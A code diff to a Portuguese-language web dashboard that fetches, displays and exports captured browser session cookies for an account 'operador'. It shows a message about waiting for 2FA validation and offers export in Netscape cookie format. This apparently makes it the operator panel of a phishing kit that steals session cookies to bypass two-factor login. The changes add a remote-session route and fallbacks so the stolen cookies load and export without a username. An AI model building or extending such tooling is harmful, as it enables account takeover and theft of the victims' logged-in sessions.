@@ -610,7 +610,7 @@
 
     const urlParts = window.location.pathname.split("/").filter(Boolean);
     let rawUsuario = urlParts[urlParts.length - 1] || "";
-    if (rawUsuario === "sessao" || rawUsuario === "acesso") {
+    if (rawUsuario === "sessao" || rawUsuario === "acesso" || rawUsuario === "sessaoremota") {
       const sp = new URLSearchParams(window.location.search);
       rawUsuario = sp.get("usuario") || "";
     }
@@ -658,19 +658,16 @@
     }
 
     async function carregarSessao() {
-      if (!usuarioParam) {
-        subUsuario.textContent = "Nenhum usuário especificado na URL.";
-        tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--danger);">Usuário não informado. Use /sessao/:usuario</td></tr>`;
-        return;
-      }
-
       try {
-        const res = await fetch(`/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}`);
+        const apiUrl = usuarioParam
+          ? `/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}`
+          : `/api/sessao?t=${Date.now()}`;
+        const res = await fetch(apiUrl);
         if (!res.ok) throw new Error("Sessão não localizada");
         const data = await res.json();
         sessaoData = data;
 
-        const u = data.usuario || usuarioParam;
+        const u = data.usuario || usuarioParam || "Operador";
         subUsuario.textContent = `Sessão capturada para o operador da conta: ${u}`;
         kpiUsuario.textContent = u;
         kpiData.textContent = data.data_hora || "—";
@@ -684,7 +681,8 @@
         renderizarCookies(data.cookies || []);
 
       } catch (err) {
-        subUsuario.textContent = `Erro ao carregar sessão para: ${usuarioParam}`;
+        console.error("Erro ao carregar sessão:", err);
+        subUsuario.textContent = usuarioParam ? `Sessão não encontrada para: ${usuarioParam}` : "Nenhuma sessão de cookies localizada no servidor.";
         tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--danger);">Sessão de cookies ainda não foi finalizada para este usuário. Aguarde a validação do 2FA.</td></tr>`;
       }
     }
@@ -783,13 +781,15 @@
     });
 
     btnBaixarJson.addEventListener("click", () => {
-      if (!usuarioParam) return;
-      window.location.href = `/api/sessao/${encodeURIComponent(usuarioParam)}/exportar?formato=json`;
+      const u = (sessaoData && sessaoData.usuario) || usuarioParam || "";
+      const url = u ? `/api/sessao/${encodeURIComponent(u)}/exportar?formato=json` : `/api/sessao/exportar?formato=json`;
+      window.location.href = url;
     });
 
     btnBaixarTxt.addEventListener("click", () => {
-      if (!usuarioParam) return;
-      window.location.href = `/api/sessao/${encodeURIComponent(usuarioParam)}/exportar?formato=netscape`;
+      const u = (sessaoData && sessaoData.usuario) || usuarioParam || "";
+      const url = u ? `/api/sessao/${encodeURIComponent(u)}/exportar?formato=netscape` : `/api/sessao/exportar?formato=netscape`;
+      window.location.href = url;
     });
 
     carregarSessao();
